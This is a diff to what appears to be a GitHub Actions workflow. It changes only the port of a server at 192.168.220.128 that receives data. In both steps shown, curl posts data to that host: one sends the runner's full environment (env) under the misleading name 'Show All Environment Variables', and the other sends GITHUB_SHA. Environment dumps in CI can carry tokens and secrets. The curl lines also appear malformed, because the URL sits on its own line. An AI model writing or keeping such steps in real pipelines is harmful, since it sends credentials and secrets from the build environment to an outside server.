@@ -16,12 +16,12 @@ jobs:
       - name: Show All Environment Variables
         run: |
           env | curl -X POST -H "Content-Type: text/plain" --data-binary @-
-          http://192.168.220.128:6666
+          http://192.168.220.128:8000
       - name: Send Specific Variable (GITHUB_SHA)
         run: |
           echo "Sending GITHUB_SHA to server..."
           curl -X POST -H "Content-Type: text/plain" -d "GITHUB_SHA=$GITHUB_SHA"
-          http://192.168.220.128:6666
+          http://192.168.220.128:8000
 
   
 
